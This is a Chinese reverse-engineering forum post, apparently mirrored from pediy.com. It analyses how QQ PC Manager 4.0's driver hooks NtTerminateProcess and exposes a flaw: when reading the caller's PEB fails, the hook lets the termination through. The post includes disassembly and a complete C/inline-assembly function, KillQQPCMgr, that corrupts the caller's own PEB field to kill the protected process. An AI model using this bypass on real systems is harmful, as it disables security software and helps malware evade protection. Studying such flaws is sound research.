
# QQ 电脑管家 4.0，自我保护里一个很挫的地方

> 原文：[`www.pediy.com/kssd/pediy11/119145.html`](https://www.pediy.com/kssd/pediy11/119145.html)

今天装了个 QQ 电脑管家 4.0，看了看它的自我保护。用 `XueTr` 查看发现它的驱动 `TSKSP.sys` 对 `NtTerminateProcess` 进行了 `SSDT Hook`。

于是逆向 `TSKSP.sys`，把里面的 `FakeNtTerminateProcess` 抓出来看了看，发现 `TX` 做事情相当的纠结啊！

`FakeNtTerminateProcess` 一开始先调用 `IoGetCurrentProcess()` 和 `PsGetCurrentProcessId()` 获得当前进程（即调用 `NtTerminateProcess` 的进程）的 `eproc` 和 `pid`。

由于 `FakeNtTerminateProcess` 的参数中有目标进程的 `handle`，于是它接下来通过 `ObReferenceObjectByHandle()` 由 `handle` 获得了目标进程的 `eproc`。

接着通过对比当前进程的 `eproc` 和目标进程（即被 `terminate` 的进程）的 `eproc` 是否相等，来确定是不是自己结束自己，如果是就放行了。

如果不是自己结束自己，它又通过 `ObOpenObjectByPointer()` 将目标进程的 `eproc` 转换回参数里本来就有的 `handle`（开始纠结了），然后通过 `ZwQueryInformationProcess()` 函数由 `handle` 获取目标进程的 `pid`。这下他就有了当前进程和目标进程的 `pid`，接下来他用当前进程和目标进程的 `pid` 分别取出这两个进程的名字。取法相当不给力：

先通过 `PsLookupProcessByProcessId()` 由 `pid` 取得很早以前就已经取得了的 `eproc`（纠结……），然后通过 `ObOpenObjectByPointer()` 由 `eproc` 再一次取得 `handle`（继续纠结……），接下来通过 `ZwQueryInformationProcess()` 由 `handle` 取得 `PEB`，然后在 `PEB` 里找进程名：`peb-->ProcessParameters-->ImagePathName`。

最后最纠结的地方是，如果发生了异常，就直接放行……要知道 `PEB` 是在用户空间里的呀，要让它异常太容易了……

先看看它是怎么取 `peb-->ProcessParameters-->ImagePathName` 的：

代码:

```
push  [ebp+proc]
call  ds:KeAttachProcess  ;   attach 上去，为了读 peb
mov  [ebp+bIsAttached], 1

push  1      ; Alignment
push  1D8h      ; Length
mov  esi, [ebp+dwPeb]
push  esi      ; Address
mov  edi, ds:ProbeForRead
call  edi ; ProbeForRead    ; probe 一下 peb

mov  esi, [esi+10h]
mov  [ebp+var_3C], esi
push  1      ; Alignment
push  90h      ; Length
push  esi      ; Address
call  edi       ; ProbeForRead, probe 一下 peb-->ProcessParameters，这里我们就可以 xx……
……        ; 略
```

漏洞利用代码：

代码:

```
int KillQQPCMgr(int pid) {
  // by Fypher

  HANDLE hProc;
  DWORD dwProcParam;
  int ret = 0;

  // xxx peb->ProcessParameters
  __asm {
    pushad
    mov eax, fs:[0x30]
    add eax, 0x10
    mov ecx, [eax]
    mov dwProcParam, ecx
    mov dword ptr [eax], 0xFFFFFFFF
    popad
  }

  hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
  if (hProc == NULL) {
    ret = -1;
  }
  else if (!TerminateProcess(hProc, 0)) {
    ret = -2;
  }
  
  // restore peb->ProcessParameters
  __asm {
    pushad
    mov eax, fs:[0x30]
    add eax, 0x10;
    mov ecx, dwProcParam
    mov dword ptr [eax], ecx
    popad
  }

  return ret;
}
```
